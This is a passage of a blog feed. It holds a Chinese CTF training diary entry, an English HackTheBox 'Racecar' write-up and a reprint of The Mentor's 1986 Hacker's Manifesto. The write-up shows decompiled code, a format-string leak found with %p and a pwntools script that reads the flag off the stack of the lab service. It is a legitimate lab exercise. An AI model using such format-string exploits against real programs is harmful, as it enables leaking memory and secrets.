        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>在這次 SCIST 的期末考結束之後，我發現我平常刷的題目的難度和真實比賽的難度好像有點落差。（PicoCTF 可能大部分題目本來就是比較練習+新手導向）雖然每次刷完 Pico 都還是覺得有學習到新東西，但可能這樣的訓練程度離我要能在比賽上的成績進步還遠遠不夠。所以我決定之後刷點別的平台的題目，HackTheBox、Hacker101、TryHackMe 等等一些其他的網站，看看能不能有所好轉。</p><p>也決定明年大二的短期計劃就是要多參加 CTF 比賽，感覺還是得多參加比賽才會進步的快速。總之，我會加油的。</p><h1 id="今日進度">今日進度</h1><ol><li><a href="https://cx330.tw/posts/331a6b46/">HTB 的 Racecar</a></li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>08：30</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HTB] Racecar Writeup 🏎️</title>
      <link href="/posts/331a6b46/"/>
      <url>/posts/331a6b46/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Challenge-Info">0x00 Challenge Info</h1><p>This challenge gives us an executable file, which is a binary file. And the challenge description is as follows.</p><blockquote><p>Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag!</p></blockquote><p>Ok, nothing helps. It’s just a little fun fact.</p><h1 id="0x01-Analyse">0x01 Analyse</h1><p>So first of all, we can run the file first to see what this program works and where can be vulnerable. Enter <code>./racecar</code> on the terminal to see what’s going on.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240712112015440.png" alt="Game info"></p><p>As you can see, it’s a racecar game. After we know what this program is, we can now check the code of this program. So I use <a href="https://hex-rays.com/ida-pro/">IDA</a> to open this file, and press <code>tab</code> to see the decompiled code. I’ll put the code below so if you want to see how it works you can check it out. This is the <code>main</code> function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setup();</span><br><span class="line">  banner();</span><br><span class="line">  info();</span><br><span class="line">  <span class="keyword">while</span> ( check )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = menu();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      car_info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      check = <span class="number">0</span>;</span><br><span class="line">      car_menu();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%s[-] Invalid choice!%s\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nothing special here. It’s just letting the player choose their name and nickname, etc. But if you check the <code>car_menu</code> function, you can find something interesting in it.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">car_menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-Ch] [ebp-64h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ch] [ebp-64h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-Ch] [ebp-64h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-8h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp-8h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-8h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp-8h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp-8h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp-4h] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+0h] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+0h] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [esp+8h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp+18h] [ebp-40h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">44</span>]; <span class="comment">// [esp+20h] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v23; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v23 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v13 = <span class="number">-1</span>;</span><br><span class="line">  v15 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;unk_1948, v4, v7);</span><br><span class="line">    v18 = read_int(v13, v15);</span><br><span class="line">    <span class="keyword">if</span> ( v18 != <span class="number">2</span> &amp;&amp; v18 != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%s[-] Invalid choice!%s\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v18 != <span class="number">2</span> &amp;&amp; v18 != <span class="number">1</span> );</span><br><span class="line">  v19 = race_type();</span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> &amp;&amp; v19 == <span class="number">2</span> || v18 == <span class="number">2</span> &amp;&amp; v19 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = rand() % <span class="number">10</span>;</span><br><span class="line">    v16 = rand() % <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v18 == <span class="number">1</span> &amp;&amp; v19 == <span class="number">1</span> || v18 == <span class="number">2</span> &amp;&amp; v19 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = rand() % <span class="number">100</span>;</span><br><span class="line">    v16 = rand() % <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = rand() % <span class="number">100</span>;</span><br><span class="line">    v16 = rand() % <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="built_in">strlen</span>(<span class="string">&quot;\n[*] Waiting for the race to finish...&quot;</span>); ; i = <span class="built_in">strlen</span>(<span class="string">&quot;\n[*] Waiting for the race to finish...&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = i;</span><br><span class="line">    result = v17;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v17 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">putchar</span>(aWaitingForTheR[v17]);</span><br><span class="line">    <span class="keyword">if</span> ( aWaitingForTheR[v17] == <span class="number">46</span> )</span><br><span class="line">      sleep(<span class="number">0</span>);</span><br><span class="line">    ++v17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> &amp;&amp; (result = v14, v14 &lt; v16) || v18 == <span class="number">2</span> &amp;&amp; (result = v14, v14 &gt; v16) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n[+] You won the race!! You get 100 coins!\n&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>, v7);</span><br><span class="line">    coins += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Current coins: [%d]%s\n&quot;</span>, coins, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Do you have anything to say to the press after your big victory?\n&gt; %s&quot;</span>, <span class="string">&quot;\x1B[0m&quot;</span>, v8);</span><br><span class="line">    v20 = <span class="built_in">malloc</span>(<span class="number">369</span>);</span><br><span class="line">    v21 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v21 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>, v9);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">105</span>, v5, v10, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    fgets(v22, <span class="number">44</span>, v21);</span><br><span class="line">    read(<span class="number">0</span>, v20, <span class="number">368</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(v20, v6, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v18 == <span class="number">1</span> &amp;&amp; (result = v14, v14 &gt; v16) || v18 == <span class="number">2</span> &amp;&amp; (result = v14, v14 &lt; v16) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n[-] You lost the race and all your coins!\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>, v7);</span><br><span class="line">    coins = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[+] Current coins: [%d]%s\n&quot;</span>, <span class="number">0</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Just in case you don’t want to see the code, here’s the conclusion.</p><ol><li><p>If you choose the 1st car and 2nd race or 2nd car and 1st race, you have high opportunity to win. (But it’s not important, you can just try and remember one of the winning choices.)</p></li><li><p>If you win, it’ll let you input something and print it out.</p></li><li><p>Also, if you win, it’ll read the <code>flag.txt</code> file but won’t output them, just save it in the stack.</p></li></ol><p>Since the program will shut down if it can’t read the <code>flag.txt</code>, which will make us can’t try the correct payload, we should make a fake flag first. Here I create a fake <code>flag.txt</code> in the current directory with <code>AAAAAAAA</code> as its content. That’s because it’ll make it easier for us to locate its position since it will be displayed as <code>41414141 41414141</code> in hexadecimal.</p><p>After doing that, we run the program and try to enter some malicious input after winning the game. So, I try to input <code>%p</code> to see if there’s a <a href="https://owasp.org/www-community/attacks/Format_string_attack">format string vulnerability</a>.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240712150929732.png" alt="Format string vulnerability PoC"></p><p>Voila! The program output the value of the pointer which is caused by <code>%p</code>. So now we know that there is a vulnerability to be exploited here. In the next step, we need to know where is the offset of the flag. To obtain the offset, we use a lot of <code>%p</code> to see at which the program outputs the flag, which is <code>41414141 41414141</code> in our case. Here’s the output.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Select race:</span><br><span class="line">1. Highway battle</span><br><span class="line">2. Circuit</span><br><span class="line">&gt; 1</span><br><span class="line">[*] Waiting for the race to finish...</span><br><span class="line">[+] You won the race!! You get 100 coins!</span><br><span class="line">[+] Current coins: [169]</span><br><span class="line">[!] Do you have anything to say to the press after your big victory?</span><br><span class="line">&gt; %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br><span class="line"></span><br><span class="line">The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:</span><br><span class="line">0x57a3d200 0x170 0x56595dfa 0x3 (nil) 0x26 0x2 0x1 0x5659696c 0x57a3d200 0x57a3d380 0x41414141 0x41414141 0xf7c5000a 0x170c0c00 0x56596d58 0x56598f8c 0xffaecf38 0x5659638d 0x56596540</span><br></pre></td></tr></table></figure><p>We can see that the first part of <code>41414141</code> appears at the 12th position, so the offset is 11. Now, let’s hack the planet!</p><h1 id="0x02-Exploit">0x02 Exploit</h1><p>Since we know the offset is 11, we can easily write a Python script to exploit it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">b&quot;94.237.53.113&quot;</span>, <span class="number">39497</span>)  <span class="comment"># This IP is mine, you can change it to yours.</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Name: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;CX330&quot;</span>)  <span class="comment"># Doesn&#x27;t matter</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Nickname: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;CX330&quot;</span>)  <span class="comment"># Doesn&#x27;t matter</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;%p &quot;</span> * <span class="number">11</span> + <span class="string">b&quot;\nflag: &quot;</span> + <span class="string">b&quot;%p &quot;</span> * <span class="number">12</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Okay, then we got the flag in little-endian in hexadecimal. The last thing we need to do is to decode it to ASCII text so that we can submit that flag to HTB. And because the flag is now in little-endian, so remember to decode it in the right sequence. This is how I do it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hex_string = <span class="string">&quot;0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0x2bf13700&quot;</span> <span class="comment"># This is flag</span></span><br><span class="line">hex_list = hex_string.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">hex</span> <span class="keyword">in</span> hex_list:</span><br><span class="line">    <span class="built_in">hex</span> = <span class="built_in">hex</span>[<span class="number">2</span>:]  <span class="comment"># Remove the &quot;0X&quot; prefix</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        byte_data = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>)</span><br><span class="line">        byte_data = byte_data[::-<span class="number">1</span>]  <span class="comment"># little-endian</span></span><br><span class="line">        flag.append(byte_data.decode())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h1 id="0x03-Pwned">0x03 Pwned</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTB&#123;why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> HackTheBox </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hacker&#39;s Manifesto《駭客宣言》</title>
      <link href="/posts/5ed2c20/"/>
      <url>/posts/5ed2c20/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>本文章是在 1986 年 1 月 8 日，由 The Mentor (Loyd Blankenship) 在被逮捕後，發布在地下駭客電子雜誌 Phrack 上。為<strong>盡力保持當初作者寫作的時代背景且不破壞作者想傳達的信念</strong>，故原文會以當初發布的形式，也就是 ASCII 文字的樣態呈現。不會加以用 Markdown 排版、強調、渲染其原文的一切內容。</p><p>譯文的部分，請容許我不為各位翻譯。</p><p>一來是因為如果我翻譯了這篇文章，將會丟失原文所傳達出的意義（相信各位可以理解不同的語言的確會造成表達上的落差）；其次我也認為翻譯此文有違作者希望讀者們能夠擁有的那種絕對的好奇心。<strong>你應該要閱讀原文</strong>。<strong>駭客文化本身就和英文離不開關係</strong>，並且在這篇於電子報上所發布的文章更是如此。作者的每個換行與斷句，都有他的用意。<strong>所以你應該要閱讀原文</strong>。</p><p>最後，也要在此聲明本篇文章是<strong>轉載文章</strong>，僅為了個人喜好而收錄、分享。文章最底部有作者版權資訊。該文章的所有權利歸原作者所有。</p><h1 id="原文">原文</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">                               ==Phrack Inc.==</span><br><span class="line"></span><br><span class="line">                    Volume One, Issue 7, Phile 3 of 10</span><br><span class="line"></span><br><span class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">The following was written shortly after my arrest...</span><br><span class="line"></span><br><span class="line">                       \/\The Conscience of a Hacker/\/</span><br><span class="line"></span><br><span class="line">                                      by</span><br><span class="line"></span><br><span class="line">                               +++The Mentor+++</span><br><span class="line"></span><br><span class="line">                          Written on January 8, 1986</span><br><span class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">        Another one got caught today, it&#x27;s all over the papers.  &quot;Teenager</span><br><span class="line">Arrested in Computer Crime Scandal&quot;, &quot;Hacker Arrested after Bank Tampering&quot;...</span><br><span class="line">        Damn kids.  They&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">        But did you, in your three-piece psychology and 1950&#x27;s technobrain,</span><br><span class="line">ever take a look behind the eyes of the hacker?  Did you ever wonder what</span><br><span class="line">made him tick, what forces shaped him, what may have molded him?</span><br><span class="line">        I am a hacker, enter my world...</span><br><span class="line">        Mine is a world that begins with school... I&#x27;m smarter than most of</span><br><span class="line">the other kids, this crap they teach us bores me...</span><br><span class="line">        Damn underachiever.  They&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">        I&#x27;m in junior high or high school.  I&#x27;ve listened to teachers explain</span><br><span class="line">for the fifteenth time how to reduce a fraction.  I understand it.  &quot;No, Ms.</span><br><span class="line">Smith, I didn&#x27;t show my work.  I did it in my head...&quot;</span><br><span class="line">        Damn kid.  Probably copied it.  They&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">        I made a discovery today.  I found a computer.  Wait a second, this is</span><br><span class="line">cool.  It does what I want it to.  If it makes a mistake, it&#x27;s because I</span><br><span class="line">screwed it up.  Not because it doesn&#x27;t like me...</span><br><span class="line">                Or feels threatened by me...</span><br><span class="line">                Or thinks I&#x27;m a smart ass...</span><br><span class="line">                Or doesn&#x27;t like teaching and shouldn&#x27;t be here...</span><br><span class="line">        Damn kid.  All he does is play games.  They&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">        And then it happened... a door opened to a world... rushing through</span><br><span class="line">the phone line like heroin through an addict&#x27;s veins, an electronic pulse is</span><br><span class="line">sent out, a refuge from the day-to-day incompetencies is sought... a board is</span><br><span class="line">found.</span><br><span class="line">        &quot;This is it... this is where I belong...&quot;</span><br><span class="line">        I know everyone here... even if I&#x27;ve never met them, never talked to</span><br><span class="line">them, may never hear from them again... I know you all...</span><br><span class="line">        Damn kid.  Tying up the phone line again.  They&#x27;re all alike...</span><br><span class="line"></span><br><span class="line">        You bet your ass we&#x27;re all alike... we&#x27;ve been spoon-fed baby food at</span><br><span class="line">school when we hungered for steak... the bits of meat that you did let slip</span><br><span class="line">through were pre-chewed and tasteless.  We&#x27;ve been dominated by sadists, or</span><br><span class="line">ignored by the apathetic.  The few that had something to teach found us will-</span><br><span class="line">ing pupils, but those few are like drops of water in the desert.</span><br><span class="line"></span><br><span class="line">        This is our world now... the world of the electron and the switch, the</span><br><span class="line">beauty of the baud.  We make use of a service already existing without paying</span><br><span class="line">for what could be dirt-cheap if it wasn&#x27;t run by profiteering gluttons, and</span><br><span class="line">you call us criminals.  We explore... and you call us criminals.  We seek</span><br><span class="line">after knowledge... and you call us criminals.  We exist without skin color,</span><br><span class="line">without nationality, without religious bias... and you call us criminals.</span><br><span class="line">You build atomic bombs, you wage wars, you murder, cheat, and lie to us</span><br><span class="line">and try to make us believe it&#x27;s for our own good, yet we&#x27;re the criminals.</span><br><span class="line"></span><br><span class="line">        Yes, I am a criminal.  My crime is that of curiosity.  My crime is</span><br><span class="line">that of judging people by what they say and think, not what they look like.</span><br><span class="line">My crime is that of outsmarting you, something that you will never forgive me</span><br><span class="line">for.</span><br><span class="line"></span><br><span class="line">        I am a hacker, and this is my manifesto.  You may stop this individual,</span><br><span class="line">but you can&#x27;t stop us all... after all, we&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">                               +++The Mentor+++</span><br><span class="line">_______________________________________________________________________________</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hacking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> 駭客 </tag>
            
            <tag> Hacker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 09] Grinding PicoCTF 7</title>
      <link href="/posts/94d4e36f/"/>
      <url>/posts/94d4e36f/</url>
      
